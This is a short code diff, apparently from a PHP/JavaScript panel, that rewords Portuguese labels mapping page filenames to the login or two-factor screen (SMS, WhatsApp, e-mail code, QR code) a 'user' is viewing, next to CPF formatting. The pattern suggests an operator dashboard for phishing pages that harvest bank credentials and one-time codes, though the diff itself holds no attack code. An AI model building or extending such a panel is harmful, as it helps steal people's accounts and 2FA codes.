@@ -213,20 +213,20 @@ $dado_formatado = ($tipo_identificador === 'CPF') ? formatarCPF($identificador_c
                 'dois_fatores.php': 'Usuário na Tela 2FA(autenticação de duas etapas) - Mensagem (Desktop)',
                 'dois_fatores2.php': 'Usuário na Tela 2FA com opções de duas etapas (QRCODE/SMS/WHATSAPP/EMAIL) (Desktop)',
                 'doisfatores2mobile.php': 'Usuário na Tela 2FA com opções de duas etapas (QRCODE/SMS/WHATSAPP/EMAIL) (Mobile)',
-                'sms_desktop.php': 'Usuário na tela para logar com SMS (Desktop)',
-                'sms_mobile.php': 'Usuário na tela para logar com SMS (Mobile)',
-                'sms_whats_desktop.php': 'Usuário na tela para logar com SMS via WhatsApp (Desktop)',
-                'sms_whats_mobile.php': 'Usuário na tela para logar com SMS via WhatsApp (Mobile)',
+                'sms_desktop.php': 'Usuário na tela para logar com código no SMS (Desktop)',
+                'sms_mobile.php': 'Usuário na tela para logar com código no SMS (Mobile)',
+                'sms_whats_desktop.php': 'Usuário na tela para logar com código no SMS via WhatsApp (Desktop)',
+                'sms_whats_mobile.php': 'Usuário na tela para logar com código no SMS via WhatsApp (Mobile)',
                 'qrcode-mobile.php': 'Usuário na tela para logar com QR Code (Mobile)',
                 'telaqr.php': 'Usuário na tela para logar com QR Code (Desktop)',
-                'email2fadesktop.php': 'Usuário na tela para verificar duas etapas com E-mail(Desktop)',
-                'email2famobile.php': 'Usuário na tela para verificar duas etapas com E-mail(Mobile)',
-                'emailsms_desktop.php': 'Usuário na tela para logar com  E-mail (Desktop)',
-                'emailsms_mobile.php': 'Usuário na tela para logar com  E-mail (Mobile)',
-                'sms2fadesktop.php': 'Usuário na tela para verificar duas etapas com SMS (Desktop)',
-                'sms2famobile.php': 'Usuário na tela para verificar duas etapas com SMS (Mobile)',
-                'whats2fadesktop.php': 'Usuário na tela para verificar duas etapas com WhatsApp (Desktop)',
-                'whats2framobile.php': 'Usuário na tela para verificar duas etapas com WhatsApp (Mobile)'
+                'email2fadesktop.php': 'Usuário na tela para verificar duas etapas com código no E-mail(Desktop)',
+                'email2famobile.php': 'Usuário na tela para verificar duas etapas com código no E-mail(Mobile)',
+                'emailsms_desktop.php': 'Usuário na tela para logar com código no E-mail (Desktop)',
+                'emailsms_mobile.php': 'Usuário na tela para logar com código no E-mail (Mobile)',
+                'sms2fadesktop.php': 'Usuário na tela para verificar duas etapas com código no SMS (Desktop)',
+                'sms2famobile.php': 'Usuário na tela para verificar duas etapas com código no SMS (Mobile)',
+                'whats2fadesktop.php': 'Usuário na tela para verificar duas etapas com código no WhatsApp (Desktop)',
+                'whats2framobile.php': 'Usuário na tela para verificar duas etapas com código no WhatsApp (Mobile)'
             };
 
             // Descobre o nome do arquivo da página atual
